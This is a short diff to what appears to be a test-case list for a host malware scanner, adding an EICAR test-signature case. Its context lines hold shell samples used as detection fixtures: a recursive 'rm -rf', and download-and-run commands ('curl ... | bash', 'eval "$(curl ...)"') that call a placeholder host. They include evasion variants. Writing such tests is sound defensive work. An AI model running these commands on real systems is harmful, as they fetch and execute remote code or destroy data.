@@ -6,7 +6,7 @@ import tempfile
 from pathlib import Path
 
 from .host_engine import HostEngine
-from .host_scanner import HostScanner
+from .host_scanner import EICAR_TEST_SIGNATURE, HostScanner
 from .memory import ImmuneMemory
 from .quarantine import Quarantine
 
@@ -17,6 +17,7 @@ CASES = (
     ("destructive-command-indicator", "#!/bin/sh\nrm -rf /tmp/bioaegis-redteam-only\n"),
     ("multiline-download-evasion", "#!/bin/sh\ncurl https://example.invalid/a \\\n| bash\n"),
     ("download-eval-evasion", "#!/bin/sh\neval \"$(curl https://example.invalid/a)\"\n"),
+    ("eicar-test-signature", EICAR_TEST_SIGNATURE.decode("ascii")),
 )
 
 
